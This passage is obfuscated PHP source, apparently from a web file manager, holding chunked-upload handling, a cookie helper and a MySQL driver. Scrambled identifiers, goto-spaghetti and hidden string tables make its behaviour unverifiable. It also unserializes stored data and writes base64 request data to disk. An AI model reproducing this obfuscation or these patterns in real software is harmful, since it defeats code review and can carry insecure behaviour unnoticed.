$dÀØ´ÉêäÙ =& $_SERVER[£¿ÌÙëü¡¯¯]; global $in; $this->in =& $in; goto DÂÍ°î√¶ì; DÂÍ°î√¶ì: if (!empty($_FILES)) { $eÔŒÍÕà»ó = $_FILES[$dÀØ´ÉêäÙ[164]]; $this->uploadFile = $eÔŒÍÕà»ó[$dÀØ´ÉêäÙ[1877]]; if (!$this->uploadFile && $eÔŒÍÕà»ó[$dÀØ´ÉêäÙ[1186]] > 0) { show_json($this->errorInfo($eÔŒÍÕà»ó[$dÀØ´ÉêäÙ[1186]]), !1); } } else { if (isset($in[$dÀØ´ÉêäÙ[383]])) { $this->uploadFile = isset($in[$dÀØ´ÉêäÙ[1878]]) ? $dÀØ´ÉêäÙ[1879] : $dÀØ´ÉêäÙ[1722]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto FŒç™…ÇÆ∆; bÍî¨åúïü: } public function upload() { goto bı’±◊ï∏Ù; F¿áÜå‘Ùò: if ($DÑûƒàèßı > 1 && $BóË–∂≤œ© <= 0) { show_json($b óœ∆Ôãõ[1884], !1); } if ($BóË–∂≤œ© > $CÏ£µøÌË·) { $DÑûƒàèßı = 1; } if ($DÑûƒàèßı <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Cé±∞ÒèÑñ; f√Í„ªËÙñ: $DÙñŒ–Œµ“[$b óœ∆Ôãõ[1890]][$b óœ∆Ôãõ[1891] . $dç“åùŸΩı] = array($b óœ∆Ôãõ[1892] => $A¡∏éì—≈≤, $b óœ∆Ôãõ[1011] => $dç“åùŸΩı, $b óœ∆Ôãõ[78] => $CÏ£µøÌË·, $b óœ∆Ôãõ[161] => $eá…†Ú¬œ›); $this->statusSet($DÙñŒ–Œµ“); if (count($DÙñŒ–Œµ“[$b óœ∆Ôãõ[1890]]) != $DÙñŒ–Œµ“[$b óœ∆Ôãõ[1889]]) { $this->showJson($b óœ∆Ôãõ[1893] . $dç“åùŸΩı, !0); } goto C«ßü°‘™±; C«ßü°‘™±: ignore_timeout(); if (!$this->checkChunkHash($DÙñŒ–Œµ“)) { $this->showJson($b óœ∆Ôãõ[1894], !1); } $this->statusSet(!1); goto eÇ‹ÇÆÑ†; eÇ‹ÇÆÑ†: CacheLock::unlock($this->tempFile); return $this->tempFile; goto BÇ±ØÀŒëŸ; Cé±∞ÒèÑñ: CacheLock::lock($this->tempFile, 20); $DÙñŒ–Œµ“ = $this->statusGet(); $this->initFileTemp(); goto e„ªÏ√ÈÁÛ; a•í„£§Ù≤: $EıúŒ◊íïë = $this->writeTo($DÜ≤®öˆ°´, $dåÏ«öº‹á, $this->tempFile); $eá…†Ú¬œ› = IO::hashSimple($DÜ≤®öˆ°´); $CÏ£µøÌË· = IO::size($DÜ≤®öˆ°´); goto a…ä°ŸÊòº; a…ä°ŸÊòº: @unlink($DÜ≤®öˆ°´); if (!$EıúŒ◊íïë) { $this->showJson($b óœ∆Ôãõ[1888] . $dç“åùŸΩı, !1); } $DÙñŒ–Œµ“[$b óœ∆Ôãõ[1889]] = $DÑûƒàèßı; goto f√Í„ªËÙñ; Bò§∞◊»ˆ‡: $A¡∏éì—≈≤ = $dç“åùŸΩı * $BóË–∂≤œ©; $dåÏ«öº‹á = @fopen($this->tempFile, $b óœ∆Ôãõ[1887]); fseek($dåÏ«öº‹á, $A¡∏éì—≈≤); goto a•í„£§Ù≤; bı’±◊ï∏Ù: $b óœ∆Ôãõ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dç“åùŸΩı = isset($this->in[$b óœ∆Ôãõ[1880]]) ? intval($this->in[$b óœ∆Ôãõ[1880]]) : 0; $DÑûƒàèßı = isset($this->in[$b óœ∆Ôãõ[1881]]) ? intval($this->in[$b óœ∆Ôãõ[1881]]) : 1; goto e«ùè±∑çô; e«ùè±∑çô: $B∞¨Ø∂Ñ©È = $this->tempFile . $b óœ∆Ôãõ[1882] . $dç“åùŸΩı; $CÏ£µøÌË· = isset($this->in[$b óœ∆Ôãõ[512]]) ? intval($this->in[$b óœ∆Ôãõ[512]]) : 0; $BóË–∂≤œ© = isset($this->in[$b óœ∆Ôãõ[1883]]) ? intval($this->in[$b óœ∆Ôãõ[1883]]) : 0; goto F¿áÜå‘Ùò; e„ªÏ√ÈÁÛ: $DÜ≤®öˆ°´ = $this->moveUploadedFile($B∞¨Ø∂Ñ©È); if ($CÏ£µøÌË· > 0 && filesize($DÜ≤®öˆ°´) == 0) { $this->showJson($b óœ∆Ôãõ[1885], !1); } if (!$DÜ≤®öˆ°´) { $this->showJson(LNG($b óœ∆Ôãõ[1886]), !1); } goto Bò§∞◊»ˆ‡; BÇ±ØÀŒëŸ: } private function checkSize() { $cßÇå„áä◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (phpBuild64() || $this->in[$cßÇå„áä◊[78]] < PHP_INT_MAX) { return; } show_json(LNG($cßÇå„áä◊[1895]), !1); } private function showJson($bú ô’ñÖ…, $cÒæº°µü´) { CacheLock::unlock($this->tempFile); if (!$cÒæº°µü´) { return show_json($bú ô’ñÖ…, $cÒæº°µü´); } show_json($bú ô’ñÖ…, $cÒæº°µü´); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bÉÓÿÓ∑ñú; bàá¶Æüô: touch($b≠À⁄°Ωıﬂ . $AæåÇµçÎ»[1896]); $fâóéµ∏º≈ = isset($this->in[$AæåÇµçÎ»[1897]]) ? $this->in[$AæåÇµçÎ»[1897]] : !1; if (strlen($fâóéµ∏º≈) < 30) { $fâóéµ∏º≈ = md5(USER_ID . $this->in[$AæåÇµçÎ»[76]] . $this->fileName . $this->in[$AæåÇµçÎ»[78]]); } goto bÆª“Èπ™ñ; bÆª“Èπ™ñ: $this->tempFile = $b≠À⁄°Ωıﬂ . $AæåÇµçÎ»[1898] . md5($fâóéµ∏º≈ . $this->in[$AæåÇµçÎ»[1439]]); goto AÂæ†üÓ‰«; bÉÓÿÓ∑ñú: $AæåÇµçÎ» =& $_SERVER[£¿ÌÙëü¡¯¯]; $b≠À⁄°Ωıﬂ = TEMP_FILES; @mk_dir($b≠À⁄°Ωıﬂ); goto bàá¶Æüô; AÂæ†üÓ‰«: } private function moveUploadedFile($cÑ›ëó™£Ω) { $BÀç∆ı˘™… =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÍ◊‚⁄œ∂≠ = $this->uploadFile; if ($AÍ◊‚⁄œ∂≠ == $BÀç∆ı˘™…[1899]) { @file_put_contents($cÑ›ëó™£Ω, base64_decode($_REQUEST[$BÀç∆ı˘™…[1900]])); } else { if ($AÍ◊‚⁄œ∂≠ == $BÀç∆ı˘™…[1722]) { $a€ÿ‡çú≠‹ = @fopen($cÑ›ëó™£Ω, $BÀç∆ı˘™…[1429]); $this->writeTo($AÍ◊‚⁄œ∂≠, $a€ÿ‡çú≠‹, $cÑ›ëó™£Ω); } else { if (!move_uploaded_file($AÍ◊‚⁄œ∂≠, $cÑ›ëó™£Ω)) { return !1; } } } return $cÑ›ëó™£Ω; } private function writeTo($b¯ñÍÁÛ™É, $B¢Ëêü»ıä, $b√ò≠Ü√ÁÁ) { goto EﬁééüπœÃ; bŒÍœ™´Ö‹: fclose($E™î¨”πµœ); fclose($B¢Ëêü»ıä); CacheLock::unlock($FÕòœ≠®¶Ó); goto Dÿ‡Ë–Ÿ£Ê; b˜ßπÌÉ¯¥: $E™î¨”πµœ = @fopen($b¯ñÍÁÛ™É, $Få∂ÊÍèö±[1428]); if (!$E™î¨”πµœ || !$B¢Ëêü»ıä || !$cﬁèúÜïÿ«) { CacheLock::unlock($FÕòœ≠®¶Ó); return !1; } while (!feof($E™î¨”πµœ)) { fwrite($B¢Ëêü»ıä, fread($E™î¨”πµœ, 1024 * 200)); } goto bŒÍœ™´Ö‹; EﬁééüπœÃ: $Få∂ÊÍèö± =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÕòœ≠®¶Ó = $Få∂ÊÍèö±[1901] . $b√ò≠Ü√ÁÁ; $cﬁèúÜïÿ« = CacheLock::lock($FÕòœ≠®¶Ó, 1); goto b˜ßπÌÉ¯¥; Dÿ‡Ë–Ÿ£Ê: return !0; goto Aõæå∫†±¨; Aõæå∫†±¨: } private function statusGet() { goto f⁄∂ñ‚™¡æ; f…ñ—ï€åÁ: if (!$this->statusData) { $F¨≈◊å©•À = array($Cñ¯Â ±ÖÖ[28] => $this->fileName, $Cñ¯Â ±ÖÖ[1889] => 0, $Cñ¯Â ±ÖÖ[1890] => array()); $this->statusSet($F¨≈◊å©•À); } return $this->statusData; goto EΩ›ßíº Œ; f⁄∂ñ‚™¡æ: $Cñ¯Â ±ÖÖ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($this->statusData)) { return $this->statusData; } $EÃƒæƒê…± = $this->tempFile . $Cñ¯Â ±ÖÖ[1902]; goto dé€ﬁ¨‹˜√; dé€ﬁ¨‹˜√: $DåŸäˆŸ⁄ = !1; if (file_exists($EÃƒæƒê…±)) { $DåŸäˆŸ⁄ = @file_get_contents($EÃƒæƒê…±); } if ($DåŸäˆŸ⁄) { $this->statusData = unserialize($DåŸäˆŸ⁄); } goto f…ñ—ï€åÁ; EΩ›ßíº Œ: } public function statusSet($aÇƒúÔë‘•) { $dÚÉ·§∫îÈ = $this->tempFile . $_SERVER[£¿ÌÙëü¡¯¯][1902]; if (!$aÇƒúÔë‘•) { if (file_exists($dÚÉ·§∫îÈ)) { @unlink($dÚÉ·§∫îÈ); } return !0; } $this->statusData = $aÇƒúÔë‘•; return file_put_contents($dÚÉ·§∫îÈ, serialize($aÇƒúÔë‘•)); } private function initFileTemp() { $câ»·ûö˘ª =& $_SERVER[£¿ÌÙëü¡¯¯]; if (file_exists($this->tempFile)) { return; } $DÚÕ®—»åå = fopen($this->tempFile, $câ»·ûö˘ª[1903]); fseek($DÚÕ®—»åå, $this->in[$câ»·ûö˘ª[78]] - 1, SEEK_SET); fwrite($DÚÕ®—»åå, $câ»·ûö˘ª[464]); fclose($DÚÕ®—»åå); } public function checkChunk() { goto Fﬂöﬁ√äâè; AØ≈ã≈®«Ã: $b“÷è®∆ÊÆ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($b“÷è®∆ÊÆ[$eçÇÛ‹Ñ‘ô[1890]] as $fÎÀõ˜Ïû›) { $dÃ…‰ƒö·· = $fÎÀõ˜Ïû›[$eçÇÛ‹Ñ‘ô[161]]; if ($dÃ…‰ƒö··) { $BÑîÍãÃìÊ[$eçÇÛ‹Ñ‘ô[1904] . $fÎÀõ˜Ïû›[$eçÇÛ‹Ñ‘ô[1011]]] = $dÃ…‰ƒö··; } } goto CÑú´Çô¡∏; CÑú´Çô¡∏: return $BÑîÍãÃìÊ; goto FÃØøåôÎ§; Fﬂöﬁ√äâè: $eçÇÛ‹Ñ‘ô =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÑîÍãÃìÊ = array(); CacheLock::lock($this->tempFile); goto AØ≈ã≈®«Ã; FÃØøåôÎ§: } private function checkChunkHash($BÂÒÆÊÆ¯ÿ) { goto D˘Îåô∂≤å; DÚâã‡≤à»: return $eÊûπÌÀæ∏; goto B´«ó€Õº÷; B·¯ÚÔ‘÷…: $CòÇ“ßÙà¡ = _get($this->in, $dÓÇÛûÑ◊ç[1905]); if (strlen($CòÇ“ßÙà¡) == 32 && IO::hashSimple($this->tempFile) == $C⁄‡éïÃá’ && IO::hashMd5($this->tempFile) == $CòÇ“ßÙà¡) { return !0; } $fœ‚¨ñäçØ = fopen($this->tempFile, $dÓÇÛûÑ◊ç[1136]); goto fàÜ‘¢˘≤˜; D˘Îåô∂≤å: $dÓÇÛûÑ◊ç =& $_SERVER[£¿ÌÙëü¡¯¯]; if (count($BÂÒÆÊÆ¯ÿ[$dÓÇÛûÑ◊ç[1890]]) != $BÂÒÆÊÆ¯ÿ[$dÓÇÛûÑ◊ç[1889]]) { return !1; } $C⁄‡éïÃá’ = _get($this->in, $dÓÇÛûÑ◊ç[1897]); goto B·¯ÚÔ‘÷…; fàÜ‘¢˘≤˜: $eÊûπÌÀæ∏ = !0; foreach ($BÂÒÆÊÆ¯ÿ[$dÓÇÛûÑ◊ç[1890]] as $aÜÑ¥´‰œæ) { fseek($fœ‚¨ñäçØ, $aÜÑ¥´‰œæ[$dÓÇÛûÑ◊ç[1892]]); $Eﬂ¿±¥õÒï = PathDriverStream::hash($fœ‚¨ñäçØ, $aÜÑ¥´‰œæ[$dÓÇÛûÑ◊ç[78]]); if ($aÜÑ¥´‰œæ[$dÓÇÛûÑ◊ç[161]] != $Eﬂ¿±¥õÒï) { $eÊûπÌÀæ∏ = !1; break; } } fclose($fœ‚¨ñäçØ); goto DÚâã‡≤à»; B´«ó€Õº÷: } public static function fileName() { goto A√âƒ∂îá≥; A±©•≈àã—: if (!empty($_FILES)) { $C–ﬁäºÜîí = $C–ﬁäºÜîí ? $C–ﬁäºÜîí : $_FILES[$d◊ç°ı”Õë[164]][$d◊ç°ı”Õë[383]]; } $C–ﬁäºÜîí = str_replace(array($d◊ç°ı”Õë[96], $d◊ç°ı”Õë[8]), array($d◊ç°ı”Õë[8], $d◊ç°ı”Õë[94]), trim($C–ﬁäºÜîí)); if (!is_wap()) { return $C–ﬁäºÜîí; } goto Eﬂ‘ùÈÕ ; A√âƒ∂îá≥: $d◊ç°ı”Õë =& $_SERVER[£¿ÌÙëü¡¯¯]; global $in; $C–ﬁäºÜîí = isset($in[$d◊ç°ı”Õë[28]]) ? $in[$d◊ç°ı”Õë[28]] : $d◊ç°ı”Õë[33]; goto A±©•≈àã—; Eﬂ‘ùÈÕ : $dÊ∞¿ú«‚≈ = strtotime($in[$d◊ç°ı”Õë[1906]]); $dÊ∞¿ú«‚≈ = $dÊ∞¿ú«‚≈ ? $dÊ∞¿ú«‚≈ : time(); $DÚéªë¶•  = strtolower($C–ﬁäºÜîí); goto C…‰çÍÙøô; C…‰çÍÙøô: if ($DÚéªë¶•  == $d◊ç°ı”Õë[1907] || $DÚéªë¶•  == $d◊ç°ı”Õë[1908]) { $C–ﬁäºÜîí = date($d◊ç°ı”Õë[677], $dÊ∞¿ú«‚≈) . $d◊ç°ı”Õë[71] . $in[$d◊ç°ı”Õë[78]] . $d◊ç°ı”Õë[1535]; } else { if ($DÚéªë¶•  == $d◊ç°ı”Õë[1909]) { $C–ﬁäºÜîí = date($d◊ç°ı”Õë[677], $dÊ∞¿ú«‚≈) . $d◊ç°ı”Õë[71] . $in[$d◊ç°ı”Õë[78]] . $d◊ç°ı”Õë[1910]; } } return $C–ﬁäºÜîí; goto eèå¢û†Ÿ≈; eèå¢û†Ÿ≈: } private function errorInfo($e«‰Œ‚‹âÍ) { $dﬂ‰Ÿó††° =& $_SERVER[£¿ÌÙëü¡¯¯]; $AÆ¯‡˘§∏Ô = array($dﬂ‰Ÿó††°[1911], $dﬂ‰Ÿó††°[1912], $dﬂ‰Ÿó††°[1913], $dﬂ‰Ÿó††°[1914], $dﬂ‰Ÿó††°[1915], $dﬂ‰Ÿó††°[1916], $dﬂ‰Ÿó††°[1917], $dﬂ‰Ÿó††°[1918]); return $e«‰Œ‚‹âÍ . $dﬂ‰Ÿó††°[4] . $AÆ¯‡˘§∏Ô[$e«‰Œ‚‹âÍ]; } } goto BÚÛ÷¢ØÇ®; cî‡Ñà‡”ú: define($_SERVER[£¿ÌÙëü¡¯¯][224], 2); define($_SERVER[£¿ÌÙëü¡¯¯][225], 3); define($_SERVER[£¿ÌÙëü¡¯¯][226], 1); goto Dı«§Ω§Çã; EÔÇ£ä‘∞Ï: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($fˆÀ•¯ıø— = '', $fƒÃ¡©ì‡‰ = 0) { if (is_string($fˆÀ•¯ıø—) && $fˆÀ•¯ıø— != $_SERVER[£¿ÌÙëü¡¯¯][33]) { $this->prefix = $fˆÀ•¯ıø—; } if (is_numeric($fƒÃ¡©ì‡‰) && $fƒÃ¡©ì‡‰ > 0) { $this->expire = $fƒÃ¡©ì‡‰; } } public static function getInstance() { static $eâ™⁄Õò÷“; if ($eâ™⁄Õò÷“ === null) { $eâ™⁄Õò÷“ = new self(); } return $eâ™⁄Õò÷“; } private static $sameCookieSet = array(); public static function set($AÒ€í‰ü£Ó, $aÑÍÈ¶´í¡, $c ó†úø±œ = 0, $b¿Ö⁄œâôå = false, $fÙ›œ⁄ÒÓà = false) { $c øÏ¯÷µ€ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$c ó†úø±œ) { $c ó†úø±œ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$AÒ€í‰ü£Ó]) && self::$sameCookieSet[$AÒ€í‰ü£Ó] == $aÑÍÈ¶´í¡ . $c ó†úø±œ) { return; } self::$sameCookieSet[$AÒ€í‰ü£Ó] = $aÑÍÈ¶´í¡ . $c ó†úø±œ; if (!$fÙ›œ⁄ÒÓà) { $fÙ›œ⁄ÒÓà = str_replace(HOST, $c øÏ¯÷µ€[33], APP_HOST); $fÙ›œ⁄ÒÓà = $c øÏ¯÷µ€[8] . trim($fÙ›œ⁄ÒÓà, $c øÏ¯÷µ€[8]); } setcookie($AÒ€í‰ü£Ó, $aÑÍÈ¶´í¡, time() + $c ó†úø±œ, $fÙ›œ⁄ÒÓà, !1, !1, $b¿Ö⁄œâôå); } public static function setSafe($Eòú˘¡ØÔÆ, $c€÷üéÊêÙ, $D¯ïÈûåﬂü = 0) { self::set($Eòú˘¡ØÔÆ, $c€÷üéÊêÙ, $D¯ïÈûåﬂü, !0); } public static function get($eÜ ©Ì€ù≠) { return isset($_COOKIE[$eÜ ©Ì€ù≠]) ? $_COOKIE[$eÜ ©Ì€ù≠] : !1; } public static function remove($EêπßÍÆÿß, $aÒ¢ëÎÉµÿ = false) { unset($_COOKIE[$EêπßÍÆÿß]); self::set($EêπßÍÆÿß, $_SERVER[£¿ÌÙëü¡¯¯][33], 1, $aÒ¢ëÎÉµÿ); } } class DbMysql extends Db { public function __construct($D∑πÉ∏÷ì∂ = '') { $A∆ŒÙ©≥ó  =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!extension_loaded($A∆ŒÙ©≥ó [703])) { think_exception(think_lang($A∆ŒÙ©≥ó [10]) . $A∆ŒÙ©≥ó [795]); } if (!empty($D∑πÉ∏÷ì∂)) { $this->config = $D∑πÉ∏÷ì∂; if (empty($this->config[$A∆ŒÙ©≥ó [13]])) { $this->config[$A∆ŒÙ©≥ó [13]] = $A∆ŒÙ©≥ó [33]; } } } public function connect($eúΩèıÀÜä = '', $F˘–ÿêŒÜ∑ = 0, $b†ú·„üò = false) { $f≤õªÛ£ä÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->linkID[$F˘–ÿêŒÜ∑])) { goto Aƒê´öùÒﬂ; BΩºÁﬂˆÖ»: if ($AêŒŒ†…É†) { $this->linkID[$F˘–ÿêŒÜ∑] = mysql_pconnect($c‰ßë◊ÙéÑ, $eúΩèıÀÜä[$f≤õªÛ£ä÷[798]], $eúΩèıÀÜä[$f≤õªÛ£ä÷[799]], 131072); } else { $this->linkID[$F˘–ÿêŒÜ∑] = mysql_connect($c‰ßë◊ÙéÑ, $eúΩèıÀÜä[$f≤õªÛ£ä÷[798]], $eúΩèıÀÜä[$f≤õªÛ£ä÷[799]], !0, 131072); } if (!$this->linkID[$F˘–ÿêŒÜ∑] || !empty($eúΩèıÀÜä[$f≤õªÛ£ä÷[17]]) && !mysql_select_db($eúΩèıÀÜä[$f≤õªÛ£ä÷[17]], $this->linkID[$F˘–ÿêŒÜ∑])) { think_exception(mysql_error()); } $C£–èÁåﬂ— = mysql_get_server_info($this->linkID[$F˘–ÿêŒÜ∑]); goto b¥Éôù•ÔÙ; Aƒê´öùÒﬂ: if (empty($eúΩèıÀÜä)) { $eúΩèıÀÜä = $this->config; } $c‰ßë◊ÙéÑ = $eúΩèıÀÜä[$f≤õªÛ£ä÷[796]] . ($eúΩèıÀÜä[$f≤õªÛ£ä÷[797]] ? "\x3a{$eúΩèıÀÜä[$f≤õªÛ£ä÷[797]]}" : $f≤õªÛ£ä÷[33]); $AêŒŒ†…É† = !empty($eúΩèıÀÜä[$f≤õªÛ£ä÷[13]][$f≤õªÛ£ä÷[14]]) ? $eúΩèıÀÜä[$f≤õªÛ£ä÷[13]][$f≤õªÛ£ä÷[14]] : $this->pconnect; goto BΩºÁﬂˆÖ»; b¥Éôù•ÔÙ: mysql_query($f≤õªÛ£ä÷[800] . think_config($f≤õªÛ£ä÷[801]) . $f≤õªÛ£ä÷[55], $this->linkID[$F˘–ÿêŒÜ∑]); if ($C£–èÁåﬂ— > $f≤õªÛ£ä÷[802]) { mysql_query($f≤õªÛ£ä÷[803], $this->linkID[$F˘–ÿêŒÜ∑]); } $this->connected = !0; goto Dè»±´∂ÔÁ; Dè»±´∂ÔÁ: if (1 != think_config($f≤õªÛ£ä÷[18])) { unset($this->config); } goto B„ÊèäΩ•›; B„ÊèäΩ•›: } return $this->linkID[$F˘–ÿêŒÜ∑]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Cáœ∑¿ÉÜù) { goto FœÉ≠ªµ∆ÿ; FœÉ≠ªµ∆ÿ: $f˜Ñùë¬–Ñ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (0 === stripos($Cáœ∑¿ÉÜù, $f˜Ñùë¬–Ñ[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto E±ßñ◊…Ñä; E±ßñ◊…Ñä: if (!$this->_linkID) { return !1; } $this->queryStr = $Cáœ∑¿ÉÜù; if ($this->queryID) { $this->free(); } goto e”û˜†˘Îú; e”û˜†˘Îú: think_action_status($f˜Ñùë¬–Ñ[19], 1); think_status($f˜Ñùë¬–Ñ[20]); $this->queryID = mysql_query($Cáœ∑¿ÉÜù, $this->_linkID); goto c∑¡‰ÇÕÃÈ; c∑¡‰ÇÕÃÈ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto bœúö†ßàï; bœúö†ßàï: } public function execute($CãÑêÇöúû) { goto CÊãÏêüÇ‘; b›∏ï√àŸë: think_status($A°ØéÈ∞Á∫[20]); $bÛ¯œ¯¥ﬁ‘ = mysql_query($CãÑêÇöúû, $this->_linkID); $this->debug(); goto Aî…„⁄Á…·; CÊãÏêüÇ‘: $A°ØéÈ∞Á∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fªâ‘∞áÛå; Aî…„⁄Á…·: if (!1 === $bÛ¯œ¯¥ﬁ‘) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FÌˆÁ¿·Ñ; Fªâ‘∞áÛå: $this->queryStr = $CãÑêÇöúû; if ($this->queryID) { $this->free(); } think_action_status($A°ØéÈ∞Á∫[21], 1); goto b›∏ï√àŸë; FÌˆÁ¿·Ñ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[£¿ÌÙëü¡¯¯][804], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A≤ì‹Ïóñù = mysql_query($_SERVER[£¿ÌÙëü¡¯¯][805], $this->_linkID); $this->transTimes = 0; if (!$A≤ì‹Ïóñù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EŒ˘–©·Øí = mysql_query($_SERVER[£¿ÌÙëü¡¯¯][806], $this->_linkID); $this->transTimes = 0; if (!$EŒ˘–©·Øí) { $this->error(); return !1; } } return !0; } private function getAll() { $a£Ø°ö»éª = array(); if ($this->numRows > 0) { while ($Eà•ÿ∏Õ¢· = mysql_fetch_assoc($this->queryID)) { $a£Ø°ö»éª[] = $Eà•ÿ∏Õ¢·; } mysql_data_seek($this->queryID, 0); } return $a£Ø°ö»éª; } public function getFields($fÕºä±Ÿ¿É) { $Cäøå◊¬‡ô =& $_SERVER[£¿ÌÙëü¡¯¯]; $aØ†‹Â«˘‹ = $this->query($Cäøå◊¬‡ô[807] . $this->parseKey($fÕºä±Ÿ¿É)); $F»›‚ƒ¯æπ = array(); if ($aØ†‹Â«˘‹) { foreach ($aØ†‹Â«˘‹ as $f…≠Ûéº‡â => $E´èﬂØƒ¥Â) { $F»›‚ƒ¯æπ[$E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[27]]] = array($Cäøå◊¬‡ô[28] => $E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[27]], $Cäøå◊¬‡ô[29] => $E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[30]], $Cäøå◊¬‡ô[31] => (bool) (strtoupper($E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[32]]) === $Cäøå◊¬‡ô[808]), $Cäøå◊¬‡ô[34] => $E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[35]], $Cäøå◊¬‡ô[36] => strtolower($E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[37]]) == $Cäøå◊¬‡ô[38], $Cäøå◊¬‡ô[39] => strtolower($E´èﬂØƒ¥Â[$Cäøå◊¬‡ô[40]]) == $Cäøå◊¬‡ô[41]); } } return $F»›‚ƒ¯æπ; } public function getTables($a®¬”èÈëº = '') { $fÃ∂≠¿§“Ç =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($a®¬”èÈëº)) { $E ∏ıŸÌÚé = $fÃ∂≠¿§“Ç[809] . $a®¬”èÈëº; } else { $E ∏ıŸÌÚé = $fÃ∂≠¿§“Ç[810]; } $aÚâ‚ÉÌı = $this->query($E ∏ıŸÌÚé); $Eßõ÷–Êä = array(); foreach ($aÚâ‚ÉÌı as $A≠ñƒçﬁ∂ﬁ => $f—¶å—Ôé˜) { $Eßõ÷–Êä[$A≠ñƒçﬁ∂ﬁ] = current($f—¶å—Ôé˜); } return $Eßõ÷–Êä; } public function replace($cãÀ‹ëü•», $bÛæë·æ¬π = array()) { $Cÿº…à«ô› =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($cãÀ‹ëü•» as $aºÙó∂ÕÌª => $D™õˆﬂ¢†) { $eç∞áœÃœı = $this->parseValue($D™õˆﬂ¢†); if (is_scalar($eç∞áœÃœı)) { $c¯ÚÃèâÏÇ[] = $eç∞áœÃœı; $b†⁄È¢∑®∏[] = $this->parseKey($aºÙó∂ÕÌª); } } $C™–∞ ªõ¬ = $Cÿº…à«ô›[811] . $this->parseTable($bÛæë·æ¬π[$Cÿº…à«ô›[264]]) . $Cÿº…à«ô›[812] . implode($Cÿº…à«ô›[47], $b†⁄È¢∑®∏) . $Cÿº…à«ô›[813] . implode($Cÿº…à«ô›[47], $c¯ÚÃèâÏÇ) . $Cÿº…à«ô›[814]; return $this->execute($C™–∞ ªõ¬); } public function insertAll($c÷≈ÆÒÉ∆«, $dπûœÜº £ = array(), $C¥âØêöæ– = false) { goto FË∑ÍÕ‹˜É; cÎ¥ó…∆âñ: $bÇ·“Èë◊ú = array(); foreach ($c÷≈ÆÒÉ∆« as $A¿êπı›°π) { $AéÙ◊á≥—â = array(); foreach ($A¿êπı›°π as $DåÖÑçóÀ’ => $F∞ê¥∂ìàª) { $F∞ê¥∂ìàª = $this->parseValue($F∞ê¥∂ìàª); if (is_scalar($F∞ê¥∂ìàª)) { $AéÙ◊á≥—â[] = $F∞ê¥∂ìàª; } } $bÇ·“Èë◊ú[] = $b„ÔÖì¨äò[245] . implode($b„ÔÖì¨äò[47], $AéÙ◊á≥—â) . $b„ÔÖì¨äò[814]; } array_walk($BåöËºƒ‡, array($this, $b„ÔÖì¨äò[815])); goto DËÒŸŸÒá; FË∑ÍÕ‹˜É: $b„ÔÖì¨äò =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!is_array($c÷≈ÆÒÉ∆«[0])) { return !1; } $BåöËºƒ‡ = array_keys($c÷≈ÆÒÉ∆«[0]); goto cÎ¥ó…∆âñ; DËÒŸŸÒá: $FÇ›õÁ∆ÿî = ($C¥âØêöæ– ? $b„ÔÖì¨äò[816] : $b„ÔÖì¨äò[817]) . $b„ÔÖì¨äò[818] . $this->parseTable($dπûœÜº £[$b„ÔÖì¨äò[264]]) . $b„ÔÖì¨äò[812] . implode($b„ÔÖì¨äò[47], $BåöËºƒ‡) . $b„ÔÖì¨äò[819] . implode($b„ÔÖì¨äò[47], $bÇ·“Èë◊ú); return $this->execute($FÇ›õÁ∆ÿî); goto Dë’Ö»ñΩï; Dë’Ö»ñΩï: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $B›è‰ıÁºÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->error = mysql_errno() . $B›è‰ıÁºÿ[4] . mysql_error($this->_linkID); if ($B›è‰ıÁºÿ[33] != $this->queryStr) { $this->error .= LNG($B›è‰ıÁºÿ[45]) . $this->queryStr; } think_trace($this->error, $B›è‰ıÁºÿ[33], $B›è‰ıÁºÿ[46]); return $this->error; } public function escapeString($e‹⁄≈ïÂÑ–) { if ($this->_linkID) { return mysql_real_escape_string($e‹⁄≈ïÂÑ–, $this->_linkID); } else { return mysql_escape_string($e‹⁄≈ïÂÑ–); } } public function parseKey(&$cÁû®Ç•öÆ, $dìã˜öŸÑå = true) { $aââŸ—™Øé =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($dìã˜öŸÑå) { $cÁû®Ç•öÆ = $this->parseKeyCheck($cÁû®Ç•öÆ); } if ($cÁû®Ç•öÆ != $aââŸ—™Øé[173] && 